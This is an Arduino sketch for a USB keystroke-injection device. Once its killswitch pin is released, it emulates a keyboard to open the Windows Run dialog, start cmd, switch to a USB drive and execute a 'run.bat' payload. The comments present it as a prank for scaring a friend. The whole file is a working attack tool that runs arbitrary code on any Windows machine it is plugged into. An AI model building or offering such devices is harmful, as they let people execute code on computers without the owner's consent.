#include <Keyboard.h>

int Killswitch = 2;       // It's recommended to solder a jumper to Pin 2 to prevent triggering during programming

void setup() 
{
  pinMode(Killswitch, INPUT_PULLUP);
  Keyboard.begin(KeyboardLayout_en_US);    // Change Keyboard layout according to your Computer
}

void loop() 
{
  while(digitalRead(Killswitch) == HIGH)
  {
    delay(500);
  }
  Keyboard.press(KEY_LEFT_GUI); //Press Windows Key
  Keyboard.press('r');          //Press r key
  delay(100);
  Keyboard.releaseAll();        // Release keys after "run" is launched
  Keyboard.println("cmd");      // Lanch cmd
  delay(500);                   // Wait for cmd to start up (Increase if you're using Potato PCs)
  // Lanch run.bat (For now it's optimized for the use with a seperate USB stick to launch the payload)
  Keyboard.println("D:");           // Type USB drive letter into cmd
  Keyboard.println("run.bat");      //start run.bat
  // Optionally uncomment the lines below if your computer uses multiple drives. The drive letter should always be one more than the computer alreade has
  //Keyboard.println("E:");
  //Keyboard.println("run.bat");
  //Keyboard.println("F:");
  //Keyboard.println("run.bat");
  //Keyboard.println("G:");
  //Keyboard.println("run.bat");
  delay(1000);    // Your time to laugh as you just scared your friend
}
